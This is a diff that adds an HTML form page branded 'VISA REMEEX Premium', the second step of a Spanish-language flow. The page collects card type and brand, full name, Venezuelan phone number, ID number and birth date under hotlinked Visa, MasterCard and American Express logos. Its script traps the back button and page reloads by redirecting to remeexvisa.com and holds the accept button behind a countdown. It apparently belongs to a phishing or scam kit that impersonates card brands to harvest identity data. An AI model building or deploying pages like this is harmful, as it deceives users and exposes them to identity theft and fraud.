@@ -1,0 +1,673 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>VISA REMEEX Premium - Página 2</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Página 2 de VISA REMEEX Premium. Tipo y Marca de Tarjeta, Beneficiario Receptor." />
+
+  <link rel="icon" href="https://w7.pngwing.com/pngs/400/28/png-transparent-credit-card-computer-icons-visa-electron-bank-curio-blue-text-rectangle-thumbnail.png" type="image/png" />
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet" />
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcode-generator/1.4.4/qrcode.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2pdf.js/0.9.3/html2pdf.bundle.min.js"></script>
+  <style>
+    :root {
+      /* Paleta de colores y variables globales */
+      --primary: #1434CB;
+      --secondary: #142C8E;
+      --accent: #00A3FF;
+      --success: #10B981;
+      --danger: #EF4444;
+      --warning: #F59E0B;
+
+      --background: #F0F4FF;
+      --card-bg: rgba(255, 255, 255, 0.95);
+      --text-primary: #1E293B;
+      --text-secondary: #64748B;
+
+      --border-radius-lg: 24px;
+      --border-radius: 16px;
+      --border-radius-sm: 12px;
+      --transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+      --shadow-sm: 0 4px 6px -1px rgb(0 0 0 / 0.1);
+      --shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1);
+      --shadow-lg: 0 20px 25px -5px rgb(0 0 0 / 0.1);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(135deg, #EEF2FF 0%, #E0E7FF 100%);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      color: var(--text-primary);
+      line-height: 1.6;
+    }
+
+    /* Contenedor principal */
+    .container {
+      max-width: 600px;
+      margin: 2rem auto;
+      padding: 1rem;
+      background: var(--card-bg);
+      border-radius: var(--border-radius-lg);
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(10px);
+      overflow: hidden;
+      transition: var(--transition);
+    }
+
+    .container:hover {
+      transform: translateY(-1px);
+      box-shadow: var(--shadow-lg);
+    }
+
+    /* HEADER (Título y descripción) */
+    .header {
+      text-align: center;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      padding: 2rem 1rem;
+      border-bottom-left-radius: var(--border-radius-lg);
+      border-bottom-right-radius: var(--border-radius-lg);
+      margin-bottom: 1rem;
+      position: relative;
+    }
+    .header h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      margin-bottom: 1rem;
+    }
+    .header p {
+      font-size: 1rem;
+      line-height: 1.4;
+      max-width: 500px;
+      margin: 0 auto;
+    }
+
+    /* Barra de Logos */
+    .logo-bar {
+      background: var(--card-bg);
+      backdrop-filter: blur(10px);
+      padding: 1rem 0.5rem;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 2rem;
+      border-bottom: 1px solid rgba(0,0,0,0.05);
+      margin-bottom: 1rem;
+    }
+    .logo-bar img {
+      height: 32px;
+      filter: grayscale(30%);
+      opacity: 0.8;
+      transition: var(--transition);
+    }
+    .logo-bar img:hover {
+      filter: none;
+      opacity: 1;
+      transform: scale(1.05);
+    }
+
+    /* Barra de progreso */
+    .progress-bar {
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: var(--border-radius);
+      margin-bottom: 2rem;
+      overflow: hidden;
+    }
+
+    .progress-bar-fill {
+      height: 100%;
+      background-color: var(--primary);
+      width: 0%;
+      transition: width 0.5s ease-in-out;
+    }
+
+    /* Secciones */
+    .section-content {
+      padding: 1rem;
+      display: none; /* Se ocultan inicialmente, se muestran vía JS */
+    }
+    .section-content.active {
+      display: block;
+    }
+    .section-content h2 {
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+      color: var(--primary);
+      display: flex; /* <-- Añadido para alinear el icono */
+      align-items: center; /* <-- Añadido para alinear el icono */
+      gap: 0.5rem; /* <-- Añadido para separar el icono del texto */
+    }
+
+    .section-content h2 i { /* <-- Añadido para estilizar el icono */
+      font-size: 1.2rem;
+    }
+
+    /* Formulario */
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 600;
+      color: var(--text-secondary);
+      font-size: 0.9rem;
+    }
+    .form-control {
+      width: 100%;
+      padding: 0.75rem 1rem;
+      border: 2px solid rgba(0,0,0,0.05);
+      border-radius: var(--border-radius-sm);
+      font-size: 0.95rem;
+      background: #fff;
+      transition: var(--transition);
+    }
+    .form-control:hover {
+      border-color: rgba(0,0,0,0.1);
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: var(--primary);
+      box-shadow: 0 0 0 4px rgba(20,52,203,0.1);
+    }
+
+    /* Checkbox y texto */
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      margin-top: 1rem;
+    }
+
+    /* Botones */
+    .btn {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      padding: 0.75rem 1.5rem;
+      border-radius: var(--border-radius-sm);
+      font-weight: 600;
+      font-size: 0.95rem;
+      transition: var(--transition);
+      border: none;
+      cursor: pointer;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      color: #fff;
+      box-shadow: var(--shadow-sm);
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: var(--shadow);
+    }
+    .btn-outline {
+      background: transparent;
+      color: var(--primary);
+      border: 2px solid var(--primary);
+    }
+    .btn-outline:hover {
+      background: rgba(20,52,203,0.05);
+    }
+
+    /* Modal de Resumen */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.4);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .modal-content {
+      background: white;
+      border-radius: var(--border-radius-lg);
+      padding: 2rem;
+      max-width: 500px;
+      width: 90%;
+      box-shadow: var(--shadow-lg);
+      position: relative;
+    }
+    .modal-content h3 {
+      margin-bottom: 1rem;
+      text-align: center;
+      font-size: 1.2rem;
+      color: var(--primary);
+    }
+    .modal-content p {
+      margin-bottom: 0.5rem;
+      line-height: 1.4;
+    }
+    .modal-buttons {
+      margin-top: 1.5rem;
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+    }
+    .countdown {
+      font-size: 0.9rem;
+      color: var(--text-secondary);
+    }
+
+    @media (max-width: 768px) {
+      .header {
+        padding: 1.5rem 1rem;
+      }
+      .header h1 {
+        font-size: 1.6rem;
+      }
+      .container {
+        margin: 1rem auto;
+        padding: 0.5rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+
+  <div class="header">
+    <h1>VISA REMEEX Premium</h1>
+    <p>
+      En esta segunda parte, selecciona el tipo y la marca de tu tarjeta
+      y completa los datos del beneficiario receptor.
+    </p>
+  </div>
+
+  <div class="logo-bar">
+    <img src="https://cdn.visa.com/v2/assets/images/logos/visa/blue/logo.png" alt="Visa Logo">
+    <img src="https://www.mastercard.es/content/dam/public/mastercardcom/es/favicon/mc-logo-52.svg" alt="MasterCard Logo">
+    <img src="https://www.aexp-static.com/cdaas/one/statics/axp-static-assets/1.8.0/package/dist/img/logos/dls-logo-stack.svg" alt="American Express Logo">
+  </div>
+
+  <div class="progress-bar">
+    <div class="progress-bar-fill" id="progressBarFill"></div>
+  </div>
+
+  <div class="section-content active" id="step1">
+    <h2><i class="fas fa-credit-card"></i> Tipo de Tarjeta</h2>
+    <div class="form-group">
+      <label class="form-label" for="cardMethod">Seleccione el tipo de Tarjeta</label>
+      <select class="form-control" id="cardMethod">
+        <option value="">-- Selecciona --</option>
+        <option value="Crédito Internacional">Tarjeta de crédito internacional</option>
+        <option value="Débito Internacional">Tarjeta de débito internacional</option>
+      </select>
+    </div>
+
+    <div class="form-group" id="brandContainer" style="display:none;">
+      <label class="form-label" for="cardBrand">Marca de Tarjeta</label>
+      <select class="form-control" id="cardBrand">
+        <option value="">-- Selecciona --</option>
+        <option value="VISA">VISA</option>
+        <option value="MasterCard">MasterCard</option>
+        <option value="AmericanExpress">AmericanExpress</option>
+      </select>
+    </div>
+
+    <div style="display:flex; justify-content:flex-end;">
+      <button class="btn btn-primary" id="continueBtnStep1">Continuar</button>
+    </div>
+  </div>
+
+  <div class="section-content" id="step2">
+    <h2><i class="fas fa-user"></i> Beneficiario Receptor</h2>
+    <p style="margin-bottom:1rem; font-size:0.9rem; color:var(--text-secondary);">
+      Completa tus datos para validar tu identidad.
+      Asegúrate de que coincidan con tu documento oficial.
+    </p>
+
+    <div class="form-group">
+      <label class="form-label" for="fullName">Nombres y Apellidos</label>
+      <input type="text" class="form-control" id="fullName" placeholder="Ej.: Juan Pérez" />
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="phonePrefix">Teléfono</label>
+      <div style="display:flex; gap:0.5rem;">
+        <select class="form-control" id="phonePrefix" style="max-width:150px;">
+          <option value="">-- Prefijo --</option>
+          <option value="0414">0414</option>
+          <option value="0424">0424</option>
+          <option value="0412">0412</option>
+          <option value="0416">0416</option>
+          <option value="0426">0426</option>
+        </select>
+        <input type="text" class="form-control" id="phoneNumber" placeholder="7 dígitos" />
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="docType">Tipo de Documento</label>
+      <select class="form-control" id="docType">
+        <option value="">-- Selecciona --</option>
+        <option value="Cédula de Identidad">Cédula de Identidad</option>
+        <option value="Pasaporte Vigente">Pasaporte Vigente</option>
+        <option value="Licencia de Conducir">Licencia de Conducir</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="nationality">Nacionalidad</label>
+      <select class="form-control" id="nationality">
+        <option value="">-- Selecciona --</option>
+        <option value="Nacional">Nacional</option>
+        <option value="Extranjero">Extranjero</option>
+      </select>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="docNumber">Número de documento</label>
+      <input type="text" class="form-control" id="docNumber" placeholder="8 a 10 dígitos" />
+    </div>
+
+    <div class="form-group">
+      <label class="form-label" for="birthDate">Fecha de nacimiento</label>
+      <input type="date" class="form-control" id="birthDate" max="9999-12-31" />
+    </div>
+
+    <div class="form-group checkbox-group">
+      <input type="checkbox" id="isAdult" />
+      <label for="isAdult">
+        Declaro que soy mayor de edad</label>
+    </div>
+
+    <div style="display:flex; justify-content:flex-end;">
+      <button class="btn btn-primary" id="continueBtnStep2">Continuar</button>
+    </div>
+  </div>
+</div>
+<div class="modal-overlay" id="modalOverlay">
+  <div class="modal-content">
+    <h3>Resumen de datos</h3>
+    <p id="summaryText"></p>
+    <div class="modal-buttons">
+      <button class="btn btn-outline" id="editBtn">Editar</button>
+      <div style="display:flex; flex-direction:column; align-items:center; gap:0.25rem;">
+        <button class="btn btn-primary" id="acceptBtn" disabled>
+          Aceptar
+        </button>
+        <span class="countdown" id="countdownMsg"></span>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+  let isRedirecting = false; // Bandera para indicar redirección
+
+  // Redirigir si el usuario presiona Atrás:
+  history.pushState({}, '', '');
+  window.addEventListener('popstate', function(event) {
+    window.location.href = "https://remeexvisa.com";
+  });
+
+  // Redirigir si el usuario recarga la página:
+  window.addEventListener('beforeunload', function(e) {
+    if (!isRedirecting) { // Solo redirigir si no es una redirección intencional
+      e.preventDefault();
+      window.location.href = "https://remeexvisa.com";
+      e.returnValue = '';
+    }
+  });
+
+  const cardMethodSelect = document.getElementById("cardMethod");
+  const brandContainer = document.getElementById("brandContainer");
+  const cardBrandSelect = document.getElementById("cardBrand");
+  const continueBtnStep1 = document.getElementById("continueBtnStep1");
+  const progressBarFill = document.getElementById("progressBarFill");
+  const sections = document.querySelectorAll(".section-content");
+  const fullNameInput = document.getElementById("fullName");
+  const phonePrefixSelect = document.getElementById("phonePrefix");
+  const phoneNumberInput = document.getElementById("phoneNumber");
+  const docTypeSelect = document.getElementById("docType");
+  const nationalitySelect = document.getElementById("nationality");
+  const docNumberInput = document.getElementById("docNumber");
+  const birthDateInput = document.getElementById("birthDate");
+  const isAdultCheckbox = document.getElementById("isAdult");
+  const continueBtnStep2 = document.getElementById("continueBtnStep2");
+  const modalOverlay = document.getElementById("modalOverlay");
+  const summaryText = document.getElementById("summaryText");
+  const editBtn = document.getElementById("editBtn");
+  const acceptBtn = document.getElementById("acceptBtn");
+  const countdownMsg = document.getElementById("countdownMsg");
+
+  let selectedOptions = {
+    cardType: false,
+    cardBrand: false,
+    beneficiaryData: false,
+  };
+
+  let currentStep = 1;
+  let countdownInterval;
+  let secondsLeft = 10;
+
+  cardMethodSelect.addEventListener("change", () => {
+    selectedOptions.cardType = !!cardMethodSelect.value;
+    brandContainer.style.display = cardMethodSelect.value ? "block" : "none";
+    updateProgressBar();
+  });
+
+  cardBrandSelect.addEventListener("change", () => {
+    selectedOptions.cardBrand = !!cardBrandSelect.value;
+    updateProgressBar();
+  });
+
+  continueBtnStep1.addEventListener("click", () => {
+    if (validateStep1()) {
+      currentStep = 2;
+      showNextSection();
+    }
+  });
+
+  continueBtnStep2.addEventListener("click", () => {
+      if (validateStep2()) {
+          showSummary();
+      }
+  });
+
+  editBtn.addEventListener("click", () => {
+    closeModal();
+  });
+
+  acceptBtn.addEventListener("click", () => {
+    if (validateSummary()) { // Asegurarse de que los datos sean válidos antes de aceptar
+      isRedirecting = true; // Establecer la bandera antes de redirigir
+      // Redirigir a la siguiente página
+      window.location.href = "page3.html";
+    }
+  });
+
+  function updateProgressBar() {
+    let completedSteps = 0;
+    for (const option in selectedOptions) {
+      if (selectedOptions[option]) {
+        completedSteps++;
+      }
+    }
+    const progressPercentage = (completedSteps / 3) * 100;
+    progressBarFill.style.width = `${progressPercentage}%`;
+  }
+
+  function showNextSection() {
+    sections.forEach((section) => {
+      section.classList.remove("active");
+    });
+
+    if (currentStep >= 1 && currentStep <= sections.length) {
+      sections[currentStep - 1].classList.add("active");
+    }
+  }
+
+  function validateStep1() {
+    if (!selectedOptions.cardType) {
+      alert("Por favor, selecciona el tipo de tarjeta.");
+      return false;
+    }
+    if (!selectedOptions.cardBrand) {
+      alert("Por favor, selecciona la marca de la tarjeta.");
+      return false;
+    }
+    return true;
+  }
+
+  function validateStep2() {
+    // Validaciones para el paso 2
+    const fullName = fullNameInput.value.trim();
+    const phonePrefix = phonePrefixSelect.value;
+    const phoneNumber = phoneNumberInput.value.trim();
+    const docType = docTypeSelect.value;
+    const nationality = nationalitySelect.value;
+    const docNumber = docNumberInput.value.trim();
+    const birthDate = birthDateInput.value;
+    const isAdult = isAdultCheckbox.checked;
+
+    // Validación de Nombres y Apellidos
+    const nameRegex = /^[a-zA-ZÀ-ÿ]+(\s[a-zA-ZÀ-ÿ]+)+$/;
+    if (!fullName || !nameRegex.test(fullName)) {
+        alert("Ingrese Nombres y Apellidos válidos (solo letras y al menos un espacio).");
+        return false;
+    }
+
+    // Validación de Teléfono
+    if (!phonePrefix) {
+        alert("Seleccione el prefijo del teléfono.");
+        return false;
+    }
+    if (!/^\d{7}$/.test(phoneNumber)) {
+        alert("El número de teléfono debe tener exactamente 7 dígitos.");
+        return false;
+    }
+
+    // Validación de Tipo de Documento
+    if (!docType) {
+        alert("Seleccione el tipo de documento.");
+        return false;
+    }
+
+    // Validación de Nacionalidad
+    if (!nationality) {
+        alert("Seleccione la nacionalidad.");
+        return false;
+    }
+
+    // Validación de Número de Documento
+    if (!/^\d{8,10}$/.test(docNumber)) {
+        alert("El número de documento debe contener entre 8 y 10 dígitos.");
+        return false;
+    }
+
+    // Validación de Fecha de Nacimiento
+    if (!birthDate) {
+        alert("Seleccione la fecha de nacimiento.");
+        return false;
+    }
+
+    // Validación de Mayor de Edad
+    if (!isAdult) {
+        alert("Debe confirmar que es mayor de edad.");
+        return false;
+    }
+
+    selectedOptions.beneficiaryData = true;
+    updateProgressBar();
+    return true;
+  }
+
+  function showSummary() {
+    const fullName = fullNameInput.value.trim();
+    const phonePrefix = phonePrefixSelect.value;
+    const phoneNumber = phoneNumberInput.value.trim();
+    const docType = docTypeSelect.value;
+    const nationality = nationalitySelect.value;
+    const docNumber = docNumberInput.value.trim();
+    const birthDate = birthDateInput.value;
+    const isAdult = isAdultCheckbox.checked;
+
+    // Prefijo del documento según docType
+    let docPrefix = "";
+    if (docType === "Cédula de Identidad") docPrefix = "V-";
+    else if (docType === "Pasaporte Vigente") docPrefix = "P-";
+    else if (docType === "Licencia de Conducir") docPrefix = "L-";
+
+    // Construimos el resumen (solo datos del beneficiario)
+    let resumen = `
+      <strong>Nombres y Apellidos:</strong> ${fullName}<br/>
+      <strong>Teléfono:</strong> ${phonePrefix}-${phoneNumber}<br/>
+      <strong>Tipo de Documento:</strong> ${docType}<br/>
+      <strong>Nacionalidad:</strong> ${nationality}<br/>
+      <strong>Número de Documento:</strong> ${docPrefix}${docNumber}<br/>
+      <strong>Fecha de Nacimiento:</strong> ${birthDate}<br/>
+    `;
+
+    summaryText.innerHTML = resumen;
+    openModal();
+  }
+
+  function openModal() {
+    modalOverlay.classList.add("active");
+
+    // Inhabilitamos el botón "Aceptar" durante 10s
+    acceptBtn.disabled = true;
+    secondsLeft = 10;
+    countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+
+    countdownInterval = setInterval(() => {
+      secondsLeft--;
+      countdownMsg.textContent = `Disponible en ${secondsLeft}s`;
+      if (secondsLeft <= 0) {
+        clearInterval(countdownInterval);
+        acceptBtn.disabled = false;
+        countdownMsg.textContent = "¡Listo para continuar!";
+      }
+    }, 1000);
+  }
+
+  function closeModal() {
+    modalOverlay.classList.remove("active");
+    clearInterval(countdownInterval);
+  }
+
+  function validateSummary() {
+    // Aquí puedes agregar cualquier validación adicional si es necesario
+    return true;
+  }
+</script>
+<script>
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+    var s1=document.createElement("script"), s0=document.getElementsByTagName("script")[0];
+    s1.async=true;
+    s1.src='https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj';
+    s1.charset='UTF-8';
+    s1.setAttribute('crossorigin','*');
+    s0.parentNode.insertBefore(s1,s0);
+  })();
+</script>
+
+</body>
+</html>
